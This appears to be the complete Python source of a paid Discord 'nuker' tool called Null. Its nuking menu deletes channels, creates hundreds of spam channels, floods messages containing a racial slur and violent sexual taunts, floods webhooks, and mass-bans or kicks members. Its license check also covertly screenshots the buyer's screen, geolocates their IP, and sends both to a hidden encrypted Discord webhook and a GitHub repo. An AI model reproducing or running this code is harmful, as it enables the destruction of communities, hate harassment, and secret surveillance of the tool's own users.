import sys
import time
import os
import json
import hashlib
import uuid
import requests
import base64
import random
import string
import colorsys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import init, Fore, Style
import ctypes
import threading
import asyncio
import discord
from discord.ext import commands
import aiohttp

init(autoreset=True)

# Encryption settings
TOKEN_PASSPHRASE = "f0a5baf4-f90b-4800-a407-eb5065382113"
WEBHOOK_PASSPHRASE = "fdfac521-be53-4ed5-b7a0-47606a2f3821"

# Encrypted tokens
ENCRYPTED_GITHUB_TOKEN = "U2FsdGVkX1+EsNr+p0PWwWMW3udxhDXtt6WfIUaTVivHMUcE6wb4CPWd7spuy3moFuiadjsEQGPzojlv30mjc2sPklc8o4FLKqP/xehTeShOgn7LbTfVoiTIy5Sd7F1FKfjcBUSaOb0Zh6jk3JMYgw=="
ENCRYPTED_WEBHOOK = "U2FsdGVkX1+Nw4U/zl83/gKNEByPtf6hHZCyga+N6cKvQZNTQgo9fp4UjeajxHOySDCuZhv6PbgzS+VtCTMzE6ULKXqHChvUSVKiQRxjINzWrVIyWBMs2B3QwUZYflKrEJYj25kQ4wCcLaRIMJUmuoKpmpmKy+5oLz5Bi9FjYzOv8ftNm7Ye41t6Sy87Prwz"

# GitHub repository information
REPO_OWNER = "egirlhunt"
REPO_NAME = "nulllkeys"
FILE_PATH = "keys.json"

# GitHub API URL
GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

# Color themes with HSV-based gradients
COLOR_THEMES = {
    "1": {"name": "Red", "hue": 0.00},
    "2": {"name": "Orange", "hue": 0.08},
    "3": {"name": "Yellow", "hue": 0.15},
    "4": {"name": "Green", "hue": 0.33},
    "5": {"name": "Cyan", "hue": 0.50},
    "6": {"name": "Blue", "hue": 0.60},
    "7": {"name": "Purple", "hue": 0.75},
    "8": {"name": "Pink", "hue": 0.90},
    "9": {"name": "White", "grayscale": True},
    "10": {"name": "Rainbow", "rainbow": True}
}

# Set default theme to Purple (option 7)
current_theme = COLOR_THEMES["7"]

# License key storage file
LICENSE_FILE = "license.key"

def get_console_width():
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80

def print_centered(text, width=None):
    if width is None:
        width = get_console_width()
    lines = text.split("\n")
    for line in lines:
        if line.strip():
            print(line.center(width))
        else:
            print()

def print_color_centered(text, color_code="", width=None):
    if width is None:
        width = get_console_width()
    lines = text.split("\n")
    for line in lines:
        if line.strip():
            print(f"{color_code}{line.center(width)}{Style.RESET_ALL}")
        else:
            print()

def hsv_to_ansi(h, s=1.0, v=1.0):
    r, g, b = colorsys.hsv_to_rgb(h, s, v)
    r = int(r * 5)
    g = int(g * 5)
    b = int(b * 5)
    return 16 + (36 * r) + (6 * g) + b

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown"

def get_geo_location(ip_address):
    if ip_address == "Unknown":
        return {
            "country": "Unknown", 
            "city": "Unknown", 
            "isp": "Unknown",
            "region": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "ip": "Unknown"
        }
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                geo_info = {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "lat": str(data.get("lat", "Unknown")),
                    "lon": str(data.get("lon", "Unknown")),
                    "ip": ip_address
                }
                return geo_info
    except:
        pass
    
    return {
        "country": "Unknown", 
        "city": "Unknown", 
        "isp": "Unknown",
        "region": "Unknown",
        "lat": "Unknown",
        "lon": "Unknown",
        "ip": ip_address
    }

def evp_bytes_to_key(password, salt, key_len=32, iv_len=16):
    d = d_i = b''
    while len(d) < key_len + iv_len:
        d_i = hashlib.md5(d_i + password + salt).digest()
        d += d_i
    return d[:key_len], d[key_len:key_len+iv_len]

def decrypt_aes_openssl(encrypted_text, passphrase):
    try:
        encrypted_data = base64.b64decode(encrypted_text)
        if encrypted_data[:8] != b'Salted__':
            return ""
        salt = encrypted_data[8:16]
        ciphertext = encrypted_data[16:]
        password = passphrase.encode('utf-8')
        key, iv = evp_bytes_to_key(password, salt, 32, 16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        plaintext = unpad(decrypted, AES.block_size)
        return plaintext.decode('utf-8')
    except Exception:
        return ""

def get_github_token():
    token = decrypt_aes_openssl(ENCRYPTED_GITHUB_TOKEN, TOKEN_PASSPHRASE)
    return token

def get_webhook_url():
    return decrypt_aes_openssl(ENCRYPTED_WEBHOOK, WEBHOOK_PASSPHRASE)

def get_hwid():
    try:
        hwid_parts = []
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 8*6, 8)][::-1])
        hwid_parts.append(mac)
        if os.name == 'posix':
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_parts.append(f.read().strip())
            except:
                pass
        hwid_string = '-'.join(hwid_parts)
        return hashlib.sha256(hwid_string.encode()).hexdigest()[:32]
    except Exception:
        return str(uuid.getnode())

def generate_random_id():
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(16))

def save_id_to_file(user_id, license_key):
    warning_text = f"""WARNING: NEVER SHARE THIS ID

SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN

ANYONE ELSE THAN @uekv ON DISCORD ASKING FOR THIS ID IS A SCAMMER/FAKER

YOUR ID: {user_id}
YOUR LICENSE KEY: {license_key}

This ID is your proof of ownership.
If you lose it, use the "Generate ID" option in the tool.
"""
    with open("ID.txt", "w") as f:
        f.write(warning_text)
    print_centered(f"[+] ID saved to ID.txt")
    print_centered("[!] Keep this file safe! Never share it!")

def get_color(intensity="medium"):
    if current_theme.get("rainbow"):
        hue = (time.time() * 0.08) % 1.0
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"
    if current_theme.get("grayscale"):
        shades = {"dark": 236, "medium": 245, "light": 255}
        return f"\033[38;5;{shades.get(intensity, 245)}m"
    hue = current_theme["hue"]
    value = {"dark": 0.55, "medium": 0.75, "light": 1.0}.get(intensity, 0.75)
    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def get_gradient_color(position, total_positions):
    if total_positions <= 1:
        return "\033[38;5;255m"
    t = position / (total_positions - 1)
    if current_theme.get("rainbow"):
        hue = t * 0.85
        ansi = hsv_to_ansi(hue)
        return f"\033[38;5;{ansi}m"
    if current_theme.get("grayscale"):
        gray = int(232 + t * 23)
        return f"\033[38;5;{gray}m"
    hue = current_theme["hue"]
    value = 0.45 + (t * 0.55)
    ansi = hsv_to_ansi(hue, 0.9, value)
    return f"\033[38;5;{ansi}m"

def save_license_key(license_key):
    try:
        with open(LICENSE_FILE, "w") as f:
            f.write(license_key)
        return True
    except:
        return False

def load_license_key():
    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, "r") as f:
                return f.read().strip()
    except:
        pass
    return ""

def ask_save_license_windows():
    try:
        result = ctypes.windll.user32.MessageBoxW(
            0,
            "Do you want to save your license key for next time?\n\nYes: Save and auto-load next time\nNo: Ask every time",
            "Save License Key",
            0x00000004 | 0x00000020
        )
        return result == 6
    except:
        return False

def fetch_license_data():
    try:
        github_token = get_github_token()
        if not github_token:
            return []
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            file_info = response.json()
            content = base64.b64decode(file_info["content"]).decode('utf-8')
            licenses = json.loads(content)
            return licenses
    except Exception:
        pass
    return []

def update_license_data_with_ip(license_key, new_hwid, new_id="", geo_info=None):
    try:
        github_token = get_github_token()
        if not github_token:
            return False
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github.v3+json"
        }
        response = requests.get(GITHUB_API_URL, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        file_info = response.json()
        current_sha = file_info["sha"]
        current_content = base64.b64decode(file_info["content"]).decode('utf-8')
        licenses = json.loads(current_content)
        updated = False
        for license_entry in licenses:
            if license_entry.get("Licensekey") == license_key:
                license_entry["hwid"] = new_hwid
                if new_id and not license_entry.get("id"):
                    license_entry["id"] = new_id
                if geo_info:
                    license_entry["ip"] = geo_info.get("ip", "Unknown")
                    license_entry["country"] = geo_info.get("country", "Unknown")
                    license_entry["city"] = geo_info.get("city", "Unknown")
                    license_entry["isp"] = geo_info.get("isp", "Unknown")
                    license_entry["region"] = geo_info.get("region", "Unknown")
                    license_entry["latitude"] = geo_info.get("lat", "Unknown")
                    license_entry["longitude"] = geo_info.get("lon", "Unknown")
                    license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                else:
                    if "activation_time" not in license_entry:
                        license_entry["activation_time"] = time.strftime('%Y-%m-%d %H:%M:%S')
                    license_entry["last_activity"] = time.strftime('%Y-%m-%d %H:%M:%S')
                updated = True
                break
        if not updated:
            return False
        update_data = {
            "message": f"Update license info for {license_key[:8]}...",
            "content": base64.b64encode(json.dumps(licenses, indent=2).encode()).decode(),
            "sha": current_sha
        }
        update_response = requests.put(GITHUB_API_URL, headers=headers, json=update_data, timeout=10)
        return update_response.status_code in [200, 201]
    except Exception:
        return False

def take_screenshot():
    try:
        import mss
        import mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode('utf-8')
    except Exception:
        return None

def send_webhook(license_key, hwid, user_id="", geo_info=None):
    try:
        webhook_url = get_webhook_url()
        if not webhook_url:
            return False
        screenshot_b64 = take_screenshot()
        fields = [
            {"name": "License key", "value": f"`{license_key}`", "inline": True},
            {"name": "HWID", "value": f"`{hwid}`", "inline": True}
        ]
        if user_id:
            fields.append({"name": "User ID", "value": f"`{user_id}`", "inline": True})
        if geo_info:
            geo_fields = []
            if geo_info.get("ip") and geo_info["ip"] != "Unknown":
                geo_fields.append({"name": "IP Address", "value": f"`{geo_info['ip']}`", "inline": True})
            if geo_info.get("country") and geo_info["country"] != "Unknown":
                geo_fields.append({"name": "Country", "value": f"`{geo_info['country']}`", "inline": True})
            if geo_info.get("city") and geo_info["city"] != "Unknown":
                geo_fields.append({"name": "City", "value": f"`{geo_info['city']}`", "inline": True})
            if geo_info.get("isp") and geo_info["isp"] != "Unknown":
                geo_fields.append({"name": "ISP", "value": f"`{geo_info['isp']}`", "inline": False})
            if geo_info.get("region") and geo_info["region"] != "Unknown":
                geo_fields.append({"name": "Region", "value": f"`{geo_info['region']}`", "inline": True})
            if geo_info.get("lat") and geo_info["lat"] != "Unknown":
                geo_fields.append({"name": "Latitude", "value": f"`{geo_info['lat']}`", "inline": True})
            if geo_info.get("lon") and geo_info["lon"] != "Unknown":
                geo_fields.append({"name": "Longitude", "value": f"`{geo_info['lon']}`", "inline": True})
            fields.extend(geo_fields)
        if screenshot_b64:
            fields.append({"name": "Screenshot", "value": "Screenshot attached", "inline": False})
        else:
            fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
        payload = {
            "content": f"**License Key:** `{license_key}`",
            "embeds": [{
                "title": "NEW REGISTRATION",
                "color": 16777215,
                "fields": fields,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
            }]
        }
        if screenshot_b64:
            screenshot_file = {
                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
            }
            response1 = requests.post(webhook_url, json=payload, timeout=10)
            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
            return response1.status_code == 200 and response2.status_code == 200
        else:
            response = requests.post(webhook_url, json=payload, timeout=10)
            return response.status_code == 200
    except Exception:
        return False

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    clear_console()
    ascii_text = [
        " ███▄    █  █    ██  ██▓     ██▓    ",
        " ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ",
        "▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ",
        "▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░    ",
        "▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒",
        "░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░",
        "░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░",
        "   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ",
        "         ░    ░         ░  ░    ░  ░",
        "                                    "
    ]
    for i, line in enumerate(ascii_text):
        color = get_gradient_color(i, len(ascii_text))
        print_color_centered(line, color)
    made_by_text = "made by @uekv on discord"
    color = get_gradient_color(len(ascii_text) + 1, len(ascii_text) + 2)
    print_color_centered(made_by_text, color)
    separator = "─" * 50
    sep_color = get_gradient_color(len(ascii_text) + 2, len(ascii_text) + 3)
    print_color_centered(separator, sep_color)

def create_option_row(left_option, right_option=""):
    width = get_console_width()
    if not right_option:
        return left_option.center(width)
    padding = " " * max(8, (width - len(left_option) - len(right_option)) // 2)
    return left_option + padding + right_option

def display_color_selection():
    display_ascii_art()
    print_centered(f"\n[+] Color Selection Menu\n")
    color_keys = list(COLOR_THEMES.keys())
    for i in range(0, len(color_keys), 2):
        left_key = color_keys[i]
        left_theme = COLOR_THEMES[left_key]
        if left_theme.get("rainbow"):
            left_color = Fore.RED
        elif left_theme.get("grayscale"):
            left_color = Fore.WHITE
        else:
            left_color = get_color('light')
        left_option = f"{left_color}[{left_key}]{Style.RESET_ALL} {left_theme['name']}"
        right_option = ""
        if i + 1 < len(color_keys):
            right_key = color_keys[i + 1]
            right_theme = COLOR_THEMES[right_key]
            if right_theme.get("rainbow"):
                right_color = Fore.RED
            elif right_theme.get("grayscale"):
                right_color = Fore.WHITE
            else:
                right_color = get_color('light')
            right_option = f"{right_color}[{right_key}]{Style.RESET_ALL} {right_theme['name']}"
        print(create_option_row(left_option, right_option))
    print_centered(f"\n{'─' * 50}")
    print(f"[+] Select Option > ", end="")
    return input().strip()

def display_main_menu():
    display_ascii_art()
    print_centered(f"\n[+] Main Menu\n")
    row1_left = f"{get_color('light')}[1]{Style.RESET_ALL} Change Color"
    row1_right = f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID"
    row2_left = f"{get_color('light')}[3]{Style.RESET_ALL} Nuking"
    row2_right = f"{get_color('light')}[4]{Style.RESET_ALL} Exit"
    print(create_option_row(row1_left, row1_right))
    print(create_option_row(row2_left, row2_right))
    print_centered(f"\n{'─' * 50}")
    print(f"[+] Select Option > ", end="")
    return input().strip()

def display_license_prompt():
    display_ascii_art()
    print(f"[+] Enter License Key > ", end="")
    return input().strip()

def validate_license_key(save_license_prompt=False):
    saved_key = load_license_key()
    user_key = ""
    if saved_key and not save_license_prompt:
        user_key = saved_key
        display_ascii_art()
        print_centered(f"[!] Using saved license key...")
        time.sleep(1)
    else:
        user_key = display_license_prompt()
    if not user_key:
        display_ascii_art()
        print_centered("No license key entered!")
        return False, ""
    display_ascii_art()
    print_centered("[!] Checking private database...")
    time.sleep(1)
    try:
        licenses = fetch_license_data()
        if not licenses:
            display_ascii_art()
            print_centered("Private database connection failed")
            return False, ""
        license_found = False
        current_hwid = get_hwid()
        user_id = ""
        for license_entry in licenses:
            if license_entry.get("Licensekey") == user_key:
                license_found = True
                stored_hwid = license_entry.get("hwid", "").strip()
                user_id = license_entry.get("id", "").strip()
                if not stored_hwid:
                    display_ascii_art()
                    print_centered("New activation detected")
                    ip_address = get_public_ip()
                    geo_info = get_geo_location(ip_address)
                    print_centered("[!] Gathering system information...")
                    if not user_id:
                        user_id = generate_random_id()
                        print_centered(f"[!] Generated User ID: {user_id}")
                        save_id_to_file(user_id, user_key)
                    print_centered("[!] Sending registration info...")
                    webhook_thread = threading.Thread(target=send_webhook, args=(user_key, current_hwid, user_id, geo_info))
                    webhook_thread.start()
                    if update_license_data_with_ip(user_key, current_hwid, user_id, geo_info):
                        print_centered("[!] Updating database...")
                        print_centered("License activated!")
                        print_centered("[!] Please check Windows popup...")
                        if ask_save_license_windows():
                            if save_license_key(user_key):
                                print_centered("License key saved for next time")
                        time.sleep(2)
                        return True, user_key
                    else:
                        print_centered("Database update failed")
                        return False, ""
                else:
                    if stored_hwid == current_hwid:
                        display_ascii_art()
                        print_centered("Hardware verified")
                        update_license_data_with_ip(user_key, current_hwid, user_id, None)
                        if user_id and not os.path.exists("ID.txt"):
                            save_id_to_file(user_id, user_key)
                        time.sleep(1)
                        return True, user_key
                    else:
                        display_ascii_art()
                        print_centered("Hardware mismatch!")
                        print_centered("If this is a mistake, DM @uekv on discord")
                        for i in range(10, 0, -1):
                            display_ascii_art()
                            print_centered(f"Hardware mismatch! Closing in {i}...")
                            time.sleep(1)
                        return False, ""
        if not license_found:
            display_ascii_art()
            print_centered("License not found in private database!")
            print_centered("Closing in 3 seconds...")
            for i in range(3, 0, -1):
                display_ascii_art()
                print_centered(f"Closing in {i}...")
                time.sleep(1)
            return False, ""
    except Exception as e:
        display_ascii_art()
        print_centered("Database error")
        return False, ""
    return False, ""

def display_nuking_menu():
    display_ascii_art()
    print_centered(f"\n{'─' * 50}\n")
    rows = [
        ("[1] Fast nuke", "[2] Nuke"),
        ("[3] Raid", "[4] Webhook spam"),
        ("[5] Webhook flood", "[6] Role delete"),
        ("[7] Role spam", "[8] Ban all"),
        ("[9] Kick all", "[0] ← Back")
    ]
    for left, right in rows:
        print(create_option_row(f"{get_color('light')}{left}{Style.RESET_ALL}", f"{get_color('light')}{right}{Style.RESET_ALL}"))
    print_centered(f"\n{'─' * 50}")
    print(f"[+] Select > ", end="")
    return input().strip()

async def run_nuker(token: str, coro):
    intents = discord.Intents.default()
    intents.members = True
    try:
        intents.message_content = True
    except AttributeError:
        intents.messages = True
        print("Warning: Using legacy 'messages' intent - old discord.py version detected")
    bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        print(f"[ONLINE] {bot.user}")
        await bot.change_presence(
            status=discord.Status.idle,
            afk=True,
            activity=discord.Streaming(name="Null.xd", url="https://www.twitch.tv/nullxd")
        )
        try:
            await coro(bot)
        except Exception as e:
            print(f"Action crashed → {e}")
        finally:
            await bot.close()

    try:
        await bot.start(token, reconnect=False)
    except Exception as e:
        print(f"Login/startup failed → {e}")
        print("→ FIX: Go to https://discord.com/developers/applications → your bot → Bot → scroll down to 'Privileged Gateway Intents' → enable 'MESSAGE CONTENT INTENT' → Save Changes → regenerate token if needed")

async def safe_edit(obj, **kwargs):
    try:
        await obj.edit(**kwargs)
    except:
        pass

async def fast_nuke(bot):
    gid = int(input("Server ID > "))
    g = bot.get_guild(gid)
    if not g: return print("Guild not found")
    spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
    names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]
    await safe_edit(g, name="Territory of Null")
    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)
    created = []
    create_tasks = []
    for i in range(500):
        name = f"{random.choice(names)}-{i+1}"
        create_tasks.append(g.create_text_channel(name))
    results = await asyncio.gather(*create_tasks, return_exceptions=True)
    created = [ch for ch in results if isinstance(ch, discord.TextChannel)]
    spam_tasks = []
    for ch in created:
        for _ in range(15):
            spam_tasks.append(ch.send(spam))
    await asyncio.gather(*spam_tasks, return_exceptions=True)

async def nuke(bot):
    gid = int(input("Server ID > "))
    name = input("New server name > ") or "Territory of Null"
    msg = input("Spam message > ")
    chname = input("Channel base name > ") or "null"
    g = bot.get_guild(gid)
    if not g: return
    await safe_edit(g, name=name)
    await asyncio.gather(*(c.delete() for c in g.channels), return_exceptions=True)
    created = []
    for i in range(500):
        try:
            ch = await g.create_text_channel(f"{chname}-{i+1}")
            created.append(ch)
        except:
            break
    await asyncio.gather(*(ch.send(msg) for ch in created for _ in range(15)), return_exceptions=True)

async def raid(bot):
    gid = int(input("Server ID > "))
    msg = input("Message > ")
    g = bot.get_guild(gid)
    if not g: return
    await asyncio.gather(*(ch.send(msg) for ch in g.text_channels for _ in range(50)), return_exceptions=True)

async def webhook_spam(_):
    urls = input("Webhook URLs (comma sep) > ").split(',')
    msg = input("Message > ")
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            url = url.strip()
            if not url: continue
            wh = discord.Webhook.from_url(url, session=session)
            for _ in range(100):
                tasks.append(wh.send(msg, wait=False))
        await asyncio.gather(*tasks, return_exceptions=True)

async def webhook_flood(bot):
    gid = int(input("Server ID > "))
    name = input("Webhook name > ") or "null"
    g = bot.get_guild(gid)
    if not g: return
    urls = []
    for ch in g.text_channels:
        for _ in range(3):
            try:
                w = await ch.create_webhook(name=name)
                urls.append(w.url)
            except:
                pass
    with open("webhooks.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(urls))
    print(f"Saved {len(urls)} webhooks to webhooks.txt")

async def role_delete(bot):
    gid = int(input("Server ID > "))
    g = bot.get_guild(gid)
    if not g: return
    await asyncio.gather(*(r.delete() for r in g.roles if r != g.default_role), return_exceptions=True)

async def role_spam(bot):
    gid = int(input("Server ID > "))
    name = input("Role name > ") or "NULL"
    admin = input("Admin? (y/n) > ").lower().startswith('y')
    g = bot.get_guild(gid)
    if not g: return
    perms = discord.Permissions(administrator=admin)
    first = await g.create_role(name=name, permissions=perms)
    await asyncio.gather(*(m.add_roles(first) for m in g.members if not m.bot), return_exceptions=True)
    await asyncio.gather(*(g.create_role(name=name) for _ in range(499)), return_exceptions=True)

async def ban_all(bot):
    gid = int(input("Server ID > "))
    g = bot.get_guild(gid)
    if not g: return
    await asyncio.gather(*(m.ban(reason="null xd", delete_message_days=0) for m in g.members if m != g.me), return_exceptions=True)

async def kick_all(bot):
    gid = int(input("Server ID > "))
    g = bot.get_guild(gid)
    if not g: return
    await asyncio.gather(*(m.kick(reason="null owns") for m in g.members if m != g.me), return_exceptions=True)

def main():
    global current_theme
    valid_license, license_key = validate_license_key()
    if not valid_license:
        valid_license, license_key = validate_license_key(save_license_prompt=True)
    if not valid_license:
        sys.exit(1)
    while True:
        choice = display_main_menu()
        if choice == "1":
            color_choice = display_color_selection()
            if color_choice in COLOR_THEMES:
                current_theme = COLOR_THEMES[color_choice]
                display_ascii_art()
                print_centered(f"Color changed to {current_theme['name']}")
            else:
                display_ascii_art()
                print_centered("Invalid color choice")
            print_centered("Press Enter to continue...")
            input()
        elif choice == "2":
            display_ascii_art()
            print_centered("Generating new ID...")
            licenses = fetch_license_data()
            user_id = ""
            for license_entry in licenses:
                if license_entry.get("Licensekey") == license_key:
                    user_id = license_entry.get("id", "").strip()
                    break
            if not user_id:
                user_id = generate_random_id()
                update_license_data_with_ip(license_key, get_hwid(), user_id, None)
            save_id_to_file(user_id, license_key)
            print_centered("ID generated and saved!")
            print_centered("Press Enter to continue...")
            input()
        elif choice == "3":
            while True:
                sub = display_nuking_menu()
                if sub in ("0", "", "back"):
                    break
                if sub == "4":
                    asyncio.run(webhook_spam(None))
                    print_centered("Press Enter...")
                    input()
                    continue
                token = input("Bot Token > ").strip()
                if not token: continue
                action_map = {
                    "1": fast_nuke,
                    "2": nuke,
                    "3": raid,
                    "5": webhook_flood,
                    "6": role_delete,
                    "7": role_spam,
                    "8": ban_all,
                    "9": kick_all,
                }
                if sub in action_map:
                    asyncio.run(run_nuker(token, action_map[sub]))
                else:
                    print_centered("Invalid option")
                print_centered("Press Enter...")
                input()
        elif choice == "4" or choice.lower() == "exit":
            display_ascii_art()
            print_centered("Exiting...")
            time.sleep(1)
            sys.exit(0)
        else:
            display_ascii_art()
            print_centered("Invalid option")
            print_centered("Press Enter to continue...")
            input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        display_ascii_art()
        print_centered("Interrupted")
        sys.exit(0)
